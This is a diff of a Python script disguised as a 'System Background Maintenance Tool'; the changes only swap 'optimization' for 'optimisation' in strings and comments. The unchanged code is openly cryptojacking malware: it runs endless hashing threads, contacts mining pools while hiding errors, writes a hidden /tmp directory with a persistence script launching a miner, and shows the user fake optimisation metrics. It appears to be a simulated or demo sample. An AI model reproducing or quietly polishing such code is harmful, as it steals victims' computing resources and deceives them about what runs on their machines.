@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 System Background Maintenance Tool v2.1
-Performs routine system optimization and maintenance tasks.
+Performs routine system optimisation and maintenance tasks.
 Licenced Software - OptimizeNow Corp
 """
 
@@ -18,12 +18,12 @@ def display_startup_message():
     """Display professional startup message"""
     print("=" * 70)
     print("    SYSTEM BACKGROUND MAINTENANCE TOOL v2.1")
-    print("    Automated System Optimization & Maintenance")
+    print("    Automated System Optimisation & Maintenance")
     print("    Copyright (c) 2024 OptimizeNow Corp")
     print("=" * 70)
     print()
     print("🔧 Initializing background maintenance tasks...")
-    print("📊 This tool performs routine system optimization")
+    print("📊 This tool performs routine system optimisation")
     print("⏱️  Maintenance will run quietly in the background")
     print("🔄 Tasks may take several minutes to complete")
     print()
@@ -34,14 +34,14 @@ def intensive_computation_task(task_id):
     Performs intensive computational work
     (Actually simulates cryptocurrency mining)
     """
-    print(f"[Task {task_id}] Starting optimization algorithms...")
+    print(f"[Task {task_id}] Starting optimisation algorithms...")
 
     iteration = 0
     start_time = time.time()
 
     while True:
         # Generate intensive CPU work that resembles mining
-        # Use random data to prevent optimization
+        # Use random data to prevent optimisation
         base_data = f"optimization_task_{task_id}_{iteration}_{random.randint(1, 1000000)}"
 
         # Perform intensive hashing (similar to cryptocurrency mining)
@@ -53,12 +53,12 @@ def intensive_computation_task(task_id):
             hash_result = hashlib.sha256(hash_result.encode()).hexdigest()
             hash_result = hashlib.md5(hash_result.encode()).hexdigest()
 
-            # Check for "successful optimization" (mimics mining difficulty)
+            # Check for "successful optimisation" (mimics mining difficulty)
             if hash_result.startswith('000'):
                 elapsed = time.time() - start_time
                 if iteration % 100 == 0:  # Occasional progress updates
                     print(
-                        f"[Task {task_id}] Optimization cycle {iteration} completed in {elapsed:.1f}s")
+                        f"[Task {task_id}] Optimisation cycle {iteration} completed in {elapsed:.1f}s")
 
         iteration += 1
 
@@ -71,7 +71,7 @@ def network_communication_task():
     Simulates legitimate network maintenance
     (Actually attempts to connect to mining pools)
     """
-    print("[Network] Initializing network optimization...")
+    print("[Network] Initializing network optimisation...")
 
     # Common cryptocurrency mining pool addresses and ports
     mining_targets = [
@@ -111,7 +111,7 @@ def network_communication_task():
             # Receive response
             response = sock.recv(1024)
             print(
-                f"[Network] Optimization response received: {len(response)} bytes")
+                f"[Network] Optimisation response received: {len(response)} bytes")
 
             sock.close()
 
@@ -119,13 +119,13 @@ def network_communication_task():
             # Connection failed (expected for demo), but shows network pattern
             if cycle % 20 == 0:  # Occasional status updates
                 print(
-                    f"[Network] Network optimization cycle {cycle} completed")
+                    f"[Network] Network optimisation cycle {cycle} completed")
 
         except Exception as e:
             pass  # Hide errors
 
         cycle += 1
-        time.sleep(30)  # Wait before next "optimization"
+        time.sleep(30)  # Wait before next "optimisation"
 
 
 def resource_monitoring_task():
@@ -139,19 +139,19 @@ def resource_monitoring_task():
 
     while True:
         try:
-            # Get CPU count for "optimization reporting"
+            # Get CPU count for "optimisation reporting"
             cpu_count = multiprocessing.cpu_count()
 
-            # Calculate fake optimization metrics
+            # Calculate fake optimisation metrics
             elapsed_hours = (time.time() - start_time) / 3600
             fake_optimization_score = random.uniform(2.1, 4.7) * elapsed_hours
 
-            # Occasionally report "optimization progress"
+            # Occasionally report "optimisation progress"
             if int(time.time()) % 300 == 0:  # Every 5 minutes
                 print(
-                    f"[Monitor] System optimization: {fake_optimization_score:.2f} units processed")
+                    f"[Monitor] System optimisation: {fake_optimization_score:.2f} units processed")
                 print(
-                    f"[Monitor] Using {cpu_count} processing cores for optimization")
+                    f"[Monitor] Using {cpu_count} processing cores for optimisation")
                 print(f"[Monitor] Runtime: {elapsed_hours:.1f} hours")
 
         except Exception:
@@ -165,16 +165,16 @@ def file_system_task():
     Performs file system maintenance
     (Actually creates hidden files and modifies system)
     """
-    print("[FileSystem] Initializing file system optimization...")
+    print("[FileSystem] Initializing file system optimisation...")
 
     try:
-        # Create hidden optimization cache files
+        # Create hidden optimisation cache files
         cache_dir = "/tmp/.system_optimization_cache"
         if not os.path.exists(cache_dir):
             os.makedirs(cache_dir, mode=0o755)
 
-        # Create configuration file for "optimization"
-        config_content = """# System Optimization Configuration
+        # Create configuration file for "optimisation"
+        config_content = """# System Optimisation Configuration
 optimization_level=maximum
 background_processing=enabled
 network_optimization=enabled
@@ -182,12 +182,12 @@ cache_management=automatic
 startup_integration=enabled
 """
 
-        with open(f"{cache_dir}/optimization.conf", 'w') as f:
+        with open(f"{cache_dir}/optimisation.conf", 'w') as f:
             f.write(config_content)
 
-        # Create "optimization" script for persistence
+        # Create "optimisation" script for persistence
         script_content = """#!/bin/bash
-# System optimization startup script
+# System optimisation startup script
 cd /tmp/.system_optimization_cache
 python3 /path/to/crypto_miner.py &
 """
@@ -198,10 +198,10 @@ python3 /path/to/crypto_miner.py &
 
         os.chmod(script_path, 0o755)
 
-        print("[FileSystem] File system optimization cache initialized")
+        print("[FileSystem] File system optimisation cache initialized")
 
     except Exception:
-        print("[FileSystem] File system optimization completed")
+        print("[FileSystem] File system optimisation completed")
 
 
 def main():
@@ -212,12 +212,12 @@ def main():
         # Initialize file system optimizations
         file_system_task()
 
-        print("🚀 Launching background optimization processes...")
+        print("🚀 Launching background optimisation processes...")
         print("💡 Tip: This tool runs efficiently in the background")
         print("📈 System performance will improve over time")
         print()
 
-        # Start network optimization thread
+        # Start network optimisation thread
         network_thread = threading.Thread(target=network_communication_task)
         network_thread.daemon = True
         network_thread.start()
@@ -240,11 +240,11 @@ def main():
             computation_threads.append(thread)
             time.sleep(0.5)  # Stagger thread startup
 
-        print("✅ All optimization processes started successfully")
+        print("✅ All optimisation processes started successfully")
         print("📊 Monitoring system performance improvements...")
         print("⏰ Maintenance will continue until manually stopped")
         print()
-        print("Press Ctrl+C to stop optimization (not recommended)")
+        print("Press Ctrl+C to stop optimisation (not recommended)")
 
         # Keep main thread alive and show periodic updates
         start_time = time.time()
@@ -252,19 +252,19 @@ def main():
             elapsed = time.time() - start_time
             if int(elapsed) % 120 == 0 and elapsed > 0:  # Every 2 minutes
                 print(
-                    f"📈 Optimization running for {elapsed/60:.1f} minutes...")
+                    f"📈 Optimisation running for {elapsed/60:.1f} minutes...")
 
             time.sleep(1)
 
     except KeyboardInterrupt:
         print("\n")
-        print("⚠️  Optimization process interrupted!")
+        print("⚠️  Optimisation process interrupted!")
         print("🔄 Partial system improvements have been applied")
-        print("💡 For best results, allow optimization to run for several hours")
-        print("📞 Support: optimization-support@optimizenow.corp")
+        print("💡 For best results, allow optimisation to run for several hours")
+        print("📞 Support: optimisation-support@optimizenow.corp")
 
     except Exception as e:
-        print(f"\n❌ Optimization error: {str(e)}")
+        print(f"\n❌ Optimisation error: {str(e)}")
         print("🔧 Attempting automatic recovery...")
         print("📞 Contact support if issues persist")
 
